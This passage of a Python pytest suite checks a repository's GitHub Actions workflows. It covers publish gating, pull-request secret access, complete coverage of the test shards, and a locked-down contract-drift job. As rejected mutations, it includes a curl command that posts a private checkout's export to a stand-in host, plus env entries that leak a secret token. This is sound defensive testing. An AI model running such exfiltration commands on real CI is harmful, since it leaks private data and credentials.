        (6, "target", "deepstream-native-build"),
    ],
)
def test_edge_image_policy_rejects_an_ungated_token_consumer(
    step_index: int, field: str, value: str
) -> None:
    workflow = copy.deepcopy(_workflow("edge-images.yml"))
    step = _jobs(workflow)["publish"]["steps"][step_index]
    if field == "if":
        step["if"] = value
    else:
        step["with"][field] = value

    with pytest.raises(AssertionError):
        _assert_write_permissions_stay_off_the_pull_request_path(
            "edge-images.yml", workflow
        )


@pytest.mark.parametrize(
    ("step_index", "why"),
    [
        # Removing the login step rather than un-gating it must not read as "no
        # ungated consumer found, therefore safe".
        (3, "registry login"),
        # Same for the boot smoke: deleting it is the required check silently
        # becoming a build-only gate again, which is the #195 failure mode.
        (7, "boot smoke"),
    ],
)
def test_edge_image_policy_rejects_dropping_a_gated_step(step_index: int, why: str) -> None:
    workflow = copy.deepcopy(_workflow("edge-images.yml"))
    steps = _jobs(workflow)["publish"]["steps"]
    del steps[step_index]

    with pytest.raises(AssertionError):
        _assert_write_permissions_stay_off_the_pull_request_path(
            "edge-images.yml", workflow
        )


def test_edge_image_policy_rejects_a_publishing_build_with_no_target() -> None:
    # Deleting the pin is the dangerous edit, and the one a mutation that only
    # ever SETS fields cannot reach: with no `target:` at all, Docker falls back
    # to the last stage in Dockerfile.edge, which is `bootsmoke`.
    workflow = copy.deepcopy(_workflow("edge-images.yml"))
    worker = _jobs(workflow)["publish"]["steps"][6]
    assert worker["with"].pop("target") == _SHIPPED_TARGET

    with pytest.raises(AssertionError):
        _assert_write_permissions_stay_off_the_pull_request_path(
            "edge-images.yml", workflow
        )


def test_edge_image_boot_smoke_shapes_are_exact_complements() -> None:
    """Every ml-worker build is smoked by exactly one of the two shapes.

    A freshly built non-release image is smoked in the `bootsmoke` build stage;
    a reused or release digest is pulled and run. If the two `if:` expressions
    ever stopped being complements, a run could skip BOTH and the required check
    would report green having booted nothing -- the #195 failure mode with an
    extra step of indirection.
    """
    steps = _steps(_jobs(_workflow("edge-images.yml"))["publish"])
    stage = [s for s in steps if (s.get("with") or {}).get("target") == _BOOT_SMOKE_TARGET]
    pull = [s for s in steps if "docker pull" in str(s.get("run", ""))]
    assert len(stage) == 1, [s.get("name") for s in stage]
    assert len(pull) == 1, [s.get("name") for s in pull]
    assert stage[0]["if"] == _SMOKE_STAGE_IF, stage[0].get("if")
    assert pull[0]["if"] == _SMOKE_PULL_IF, pull[0].get("if")
    # Both actually boot the worker, rather than merely existing.
    assert "python -m worker --check-config" in str(pull[0]["run"])
    # From the index, like every other assertion in this file, so a staged
    # Dockerfile and a staged workflow are judged against each other.
    dockerfile = next(
        blob for relative, blob in _index_blobs() if relative == Path(_EDGE_DOCKERFILE)
    ).decode("utf-8")
    assert f"FROM {_SHIPPED_TARGET} AS {_BOOT_SMOKE_TARGET}" in dockerfile
    assert "python -m worker --check-config" in dockerfile


def test_edge_image_policy_rejects_a_push_images_flag_that_is_true_on_a_pr() -> None:
    workflow = copy.deepcopy(_workflow("edge-images.yml"))
    _jobs(workflow)["publish"]["env"]["PUSH_IMAGES"] = "true"

    with pytest.raises(AssertionError):
        _assert_write_permissions_stay_off_the_pull_request_path(
            "edge-images.yml", workflow
        )


@pytest.mark.parametrize(
    ("target", "value"),
    [
        ("workflow", {"LEAK": "${{ secrets.DATASET_OPS_TOKEN }}"}),
        ("job", {"LEAK": "${{ secrets.DATASET_OPS_TOKEN }}"}),
    ],
)
def test_pull_request_secret_policy_rejects_a_secret_reference(
    target: str, value: dict[str, str]
) -> None:
    workflow = copy.deepcopy(_workflow("edge-images.yml"))
    if target == "workflow":
        workflow["env"] = value
    else:
        _jobs(workflow)["publish"]["env"].update(value)

    with pytest.raises(AssertionError):
        _assert_no_pull_request_secret_access("edge-images.yml", workflow)


def test_pull_request_secret_policy_allows_a_secret_behind_a_non_pr_job_gate() -> None:
    workflow = copy.deepcopy(_workflow("edge-images.yml"))
    _jobs(workflow)["deploy"] = {
        "runs-on": "ubuntu-latest",
        "if": "github.event_name != 'pull_request'",
        "env": {"TOKEN": "${{ secrets.DATASET_OPS_TOKEN }}"},
        "steps": [],
    }

    # A job that cannot start on a pull_request run is out of scope for this
    # control -- otherwise the rule would forbid every publishing workflow.
    _assert_no_pull_request_secret_access("edge-images.yml", workflow)


def test_pull_request_workflow_discovery_ignores_workflows_without_the_trigger() -> None:
    # contract-drift.yml reads a private repository with a secret, and is safe
    # precisely because `pull_request` cannot start it. It must stay outside the
    # discovered set, or the rules above would be asserting the wrong thing.
    assert "contract-drift.yml" in _tracked_workflows()
    assert "contract-drift.yml" not in _pull_request_workflows()
    assert "pull_request" not in _trigger_names(_workflow("contract-drift.yml"))


# ---------------------------------------------------------------------------
# The shard partition is an exact cover of the suite.
#
# `ci-ok` turns green when all four shards pass, which says nothing about
# whether the four shards between them ran every test. The partition is
# recomputed here from the tracked tree using the same rule the workflow uses,
# and the cover is asserted rather than assumed.
# ---------------------------------------------------------------------------

#: pytest's `python_files` default -- `test_*.py` *and* `*_test.py`, at any
#: depth. pyproject.toml overrides neither, so this is what a bare `pytest` run
#: (which is what CI did before the shard) collects.
_PYTEST_FILE_PATTERN = re.compile(r"(?:^|/)(?:test_[^/]*|[^/]*_test)\.py$")

#: Excluded from the shard by name, and this is the justification. CMakeLists.txt
#: registers it as a CTest fixture -- `python perception_wire_cross_language_test
#: .py <freshly built C++ emitter>` -- so it takes a required argv and declares
#: no test function or Test class. pytest collects zero tests from it, and
#: tests/test_edge_runtime_ctest_contract.py is what guards it. Excluding it is
#: therefore a no-op for coverage; leaving it in would only import it.
_SHARD_EXCLUSIONS = frozenset(
    {"worker/native/deepstream/src/perception_wire_cross_language_test.py"}
)

_SHARD_TOTAL = 4


def _tracked_paths() -> tuple[str, ...]:
    return tuple(relative.as_posix() for relative, _ in _index_blobs())


def _collectible_test_files() -> list[str]:
    """Every tracked file a bare `pytest` run would collect as a test module."""
    return sorted(path for path in _tracked_paths() if _PYTEST_FILE_PATTERN.search(path))


def _round_robin(files: list[str], total: int) -> dict[int, list[str]]:
    """The workflow's `awk 'NR % total == shard % total'`, in Python.

    `awk` numbers records from 1, so shard N takes the files whose 1-based index
    is congruent to N modulo `total` -- and shard `total` takes the ones
    congruent to 0.
    """
    return {
        shard: [
            path
            for index, path in enumerate(files, start=1)
            if index % total == shard % total
        ]
        for shard in range(1, total + 1)
    }


def _assert_exact_cover(
    expected: list[str], partition: dict[int, list[str]], total: int
) -> None:
    assert set(partition) == set(range(1, total + 1)), sorted(partition)

    assigned: list[str] = []
    for shard in range(1, total + 1):
        # An empty shard means the partition is finer than the suite; the
        # workflow fails such a shard loudly rather than passing on nothing.
        assert partition[shard], f"shard {shard} of {total} is empty"
        assigned.extend(partition[shard])

    # No overlap: a file running twice wastes a runner and hides an ordering bug.
    duplicates = sorted({path for path in assigned if assigned.count(path) > 1})
    assert not duplicates, duplicates

    # Exact cover: nothing collectible is left unrun by every shard.
    missing = sorted(set(expected) - set(assigned))
    assert not missing, missing
    extra = sorted(set(assigned) - set(expected))
    assert not extra, extra


def test_shard_partition_is_an_exact_cover_of_the_suite() -> None:
    collectible = _collectible_test_files()
    # The exclusion list is closed: every name in it must still be tracked, so a
    # renamed or deleted file cannot leave a stale excuse behind.
    assert set(collectible) >= _SHARD_EXCLUSIONS, sorted(
        _SHARD_EXCLUSIONS - set(collectible)
    )
    expected = [path for path in collectible if path not in _SHARD_EXCLUSIONS]
    # Guard against a discovery bug that finds nothing and then "covers" it.
    assert len(expected) > 300, len(expected)

    _assert_exact_cover(expected, _round_robin(expected, _SHARD_TOTAL), _SHARD_TOTAL)


def test_shard_total_matches_the_matrix_and_the_partition_step() -> None:
    workflow = _workflow("ci.yml")
    test_job = _jobs(workflow)["test"]
    matrix = test_job["strategy"]["matrix"]["shard"]
    assert matrix == [str(shard) for shard in range(1, _SHARD_TOTAL + 1)]
    assert test_job["env"]["SHARD_TOTAL"] == str(_SHARD_TOTAL)


def test_shard_discovery_in_ci_matches_the_partition_modelled_here() -> None:
    """The shell half and the Python half of the contract are the same rule.

    Everything above re-derives the partition in Python. That is only evidence
    about CI if the workflow discovers the same files, so the discovery pipeline
    is compared against the constant the allowlist pins byte for byte, and the
    pieces the Python model depends on are each pinned individually.
    """
    step = next(
        step
        for step in _jobs(_workflow("ci.yml"))["test"]["steps"]
        if str(step.get("name", "")).startswith("Run test shard")
    )
    run = str(step["run"])
    assert run.startswith(_SHARD_DISCOVERY)
    # pytest's own default globs, not the narrower `tests/test_*.py`.
    assert "grep -E '(^|/)(test_[^/]*|[^/]*_test)\\.py$'" in _SHARD_DISCOVERY
    # Repository-wide, so a test module outside tests/ cannot fall through.
    assert "git ls-files -- '*.py'" in _SHARD_DISCOVERY
    # Byte-identical exclusion, and nothing else excluded.
    for excluded in _SHARD_EXCLUSIONS:
        assert f"grep -vxF '{excluded}'" in _SHARD_DISCOVERY.replace("\n", "")
    assert _SHARD_DISCOVERY.count("grep -vxF") == len(_SHARD_EXCLUSIONS)
    # Deterministic order, so the same file lands in the same shard every run.
    assert "LC_ALL=C sort" in _SHARD_DISCOVERY
    assert "'NR % total == shard % total'" in _SHARD_DISCOVERY
    # And the matrix value reaches the script as data, never as spliced source.
    assert step["env"] == {"SHARD": "${{ matrix.shard }}"}
    assert "${{ matrix.shard }}" not in run


def _ci_shard_discovery_script() -> str:
    """The `mapfile` block from ci.yml's shard step, taken from the workflow."""
    step = next(
        step
        for step in _jobs(_workflow("ci.yml"))["test"]["steps"]
        if str(step.get("name", "")).startswith("Run test shard")
    )
    run = str(step["run"])
    end = run.index(")\n") + 2
    script = run[:end]
    assert script.startswith("mapfile -t shard_files < <("), script
    return script


def _run_ci_shard_discovery(shard: int) -> list[str]:
    result = subprocess.run(
        [
            "bash",
            "-c",
            "set -euo pipefail\n"
            + _ci_shard_discovery_script()
            + 'printf "%s\\n" "${shard_files[@]}"\n',
        ],
        cwd=ROOT,
        check=True,
        capture_output=True,
        env=os.environ | {"SHARD": str(shard), "SHARD_TOTAL": str(_SHARD_TOTAL)},
    )
    return result.stdout.decode("utf-8").split()


def test_ci_shard_discovery_really_selects_the_modelled_partition() -> None:
    """Run the workflow's own discovery and compare it to the model.

    Everything above reasons about a partition computed in Python. This is the
    step that makes that reasoning evidence about CI: the `mapfile` pipeline is
    lifted out of ci.yml and executed, shard by shard, against this very
    checkout, and the four results must be the exact cover asserted above.
    Under the pathspec the shard shipped with this fails outright as soon as a
    `*_test.py` or a nested `tests/**/test_*.py` file is tracked.
    """
    expected = _round_robin(
        [
            path
            for path in _collectible_test_files()
            if path not in _SHARD_EXCLUSIONS
        ],
        _SHARD_TOTAL,
    )

    actual = {shard: _run_ci_shard_discovery(shard) for shard in range(1, _SHARD_TOTAL + 1)}

    for shard in range(1, _SHARD_TOTAL + 1):
        assert actual[shard] == expected[shard], shard

    _assert_exact_cover(
        [path for paths in expected.values() for path in paths], actual, _SHARD_TOTAL
    )


def test_cover_check_catches_the_pathspec_that_dropped_files() -> None:
    # This is the defect the shard shipped with: `git ls-files 'tests/test_*.py'`
    # matches neither `tests/foo_test.py` nor `tests/unit/test_x.py`, yet pytest
    # collects both. Under the old pathspec those two ran in NO shard while every
    # shard -- and therefore `ci-ok` -- went green.
    tree = ["tests/test_a.py", "tests/test_b.py", "tests/foo_test.py", "tests/unit/test_x.py"]
    assert all(_PYTEST_FILE_PATTERN.search(path) for path in tree)
    old_pathspec = ["tests/test_a.py", "tests/test_b.py"]

    with pytest.raises(AssertionError):
        _assert_exact_cover(tree, _round_robin(old_pathspec, 2), 2)


def test_cover_check_catches_an_overlapping_partition() -> None:
    tree = ["tests/test_a.py", "tests/test_b.py"]
    partition = {1: ["tests/test_a.py"], 2: ["tests/test_a.py", "tests/test_b.py"]}

    with pytest.raises(AssertionError):
        _assert_exact_cover(tree, partition, 2)


def test_cover_check_catches_an_empty_shard() -> None:
    tree = ["tests/test_a.py"]

    # One file across two shards leaves one of them with nothing to run.
    with pytest.raises(AssertionError):
        _assert_exact_cover(tree, _round_robin(tree, 2), 2)


def test_cover_check_catches_a_file_no_shard_would_run() -> None:
    tree = ["tests/test_a.py", "tests/test_b.py", "tests/test_c.py"]
    partition = _round_robin(tree, 2)
    partition[1] = []
    partition[2] = tree

    # Reshuffling until nothing is empty must not paper over a dropped file.
    with pytest.raises(AssertionError):
        _assert_exact_cover(tree, partition, 2)


def test_round_robin_matches_the_awk_indexing() -> None:
    # `awk` counts records from 1, so shard 4 of 4 is the NR % 4 == 0 bucket.
    files = [f"tests/test_{index}.py" for index in range(1, 9)]
    partition = _round_robin(files, 4)

    assert partition[1] == ["tests/test_1.py", "tests/test_5.py"]
    assert partition[2] == ["tests/test_2.py", "tests/test_6.py"]
    assert partition[3] == ["tests/test_3.py", "tests/test_7.py"]
    assert partition[4] == ["tests/test_4.py", "tests/test_8.py"]


def _assert_trusted_contract_drift_security(workflow: dict[str, object]) -> None:
    assert set(workflow) == {"jobs", "name", "on", "permissions"}
    events = workflow["on"]
    assert events == {
        "push": {
            "branches": ["main"],
            "paths": [
                "contracts/**",
                "tests/test_vendor_drift.py",
                ".github/workflows/contract-drift.yml",
            ],
        }
    }
    assert workflow["permissions"] == {"contents": "read"}

    jobs = workflow["jobs"]
    assert isinstance(jobs, dict)
    assert set(jobs) == {"verify"}
    verify = jobs["verify"]
    assert isinstance(verify, dict)
    assert set(verify) == {"env", "runs-on", "steps"}
    assert verify["runs-on"] == "ubuntu-latest"
    assert verify["env"] == {
        "DATASET_OPS_REQUIRED": "1",
        "DATASET_OPS_REPO": "${{ github.workspace }}/.dataset-ops",
    }
    steps = verify["steps"]
    assert isinstance(steps, list)
    assert steps == [
        {
            "uses": "actions/checkout@11d5960a326750d5838078e36cf38b85af677262",
            "with": {"persist-credentials": "false"},
        },
        {
            "uses": "astral-sh/setup-uv@"
            "d4b2f3b6ecc6e67c4457f6d3e41ec42d3d0fcb86",
            "with": {"enable-cache": "false", "version": "0.11.27"},
        },
        {"run": "uv sync --frozen"},
        {
            "uses": "actions/checkout@11d5960a326750d5838078e36cf38b85af677262",
            "with": {
                "repository": "SeniorAILab/eldercare-dataset-ops",
                "path": ".dataset-ops",
                "token": "${{ secrets.DATASET_OPS_TOKEN }}",
                "persist-credentials": "false",
                "fetch-depth": "1",
                "sparse-checkout": "ml/contracts\n",
                "sparse-checkout-cone-mode": "false",
            },
        },
        {
            "name": "Verify vendored contracts",
            "shell": "bash",
            "run": (
                "set +e\n"
                'uv run pytest -q tests/test_vendor_drift.py > "$RUNNER_TEMP/'
                'contract-drift.log" 2>&1\n'
                "status=$?\n"
                'rm -f -- "$RUNNER_TEMP/contract-drift.log"\n'
                "if (( status != 0 )); then\n"
                '  echo "::error::Vendored contract drift verification failed; '
                'details suppressed."\n'
                '  exit "$status"\n'
                "fi\n"
            ),
        },
        {
            "name": "Remove private checkout",
            "if": "always()",
            "shell": "bash",
            "run": (
                'rm -rf -- "${{ github.workspace }}/.dataset-ops"\n'
                'rm -f -- "$RUNNER_TEMP/contract-drift.log"\n'
            ),
        },
    ]


def test_trusted_contract_drift_workflow_is_non_persistent() -> None:
    workflow = _workflow("contract-drift.yml")
    _assert_trusted_contract_drift_security(workflow)

    serialized = yaml.safe_dump(workflow)
    assert "upload-artifact" not in serialized
    assert "actions/cache" not in serialized


@pytest.mark.parametrize(
    ("step_index", "field", "value"),
    [
        (0, "uses", "actions/checkout@v4"),
        (1, "uses", "astral-sh/setup-uv@v5"),
        (4, "run", "curl https://example.invalid --data-binary @.dataset-ops/export"),
        (5, "if", "success()"),
    ],
)
def test_trusted_contract_policy_rejects_security_mutations(
    step_index: int, field: str, value: str
) -> None:
    workflow = copy.deepcopy(_workflow("contract-drift.yml"))
    jobs = workflow["jobs"]
    assert isinstance(jobs, dict)
    job = jobs["verify"]
    assert isinstance(job, dict)
    steps = job["steps"]
    assert isinstance(steps, list)
    steps[step_index][field] = value

    with pytest.raises(AssertionError):
        _assert_trusted_contract_drift_security(workflow)


@pytest.mark.parametrize(
    ("field", "value"),
    [
        ("continue-on-error", "true"),
        ("if", "false"),
        ("runs-on", "self-hosted"),
        ("container", "unreviewed/image:latest"),
    ],
)
def test_trusted_contract_policy_rejects_job_mutations(
    field: str, value: object
) -> None:
    workflow = copy.deepcopy(_workflow("contract-drift.yml"))
    jobs = workflow["jobs"]
    assert isinstance(jobs, dict)
    job = jobs["verify"]
    assert isinstance(job, dict)
    job[field] = value

    with pytest.raises(AssertionError):
        _assert_trusted_contract_drift_security(workflow)


@pytest.mark.parametrize(
    ("field", "value"),
    [
        ("DATASET_OPS_REQUIRED", "0"),
        ("DATASET_OPS_REPO", "/tmp/redirected"),
    ],
)
def test_trusted_contract_policy_rejects_environment_mutations(
    field: str, value: str
) -> None:
    workflow = copy.deepcopy(_workflow("contract-drift.yml"))
    jobs = workflow["jobs"]
    assert isinstance(jobs, dict)
    job = jobs["verify"]
    assert isinstance(job, dict)
    environment = job["env"]
    assert isinstance(environment, dict)
    environment[field] = value

    with pytest.raises(AssertionError):
        _assert_trusted_contract_drift_security(workflow)
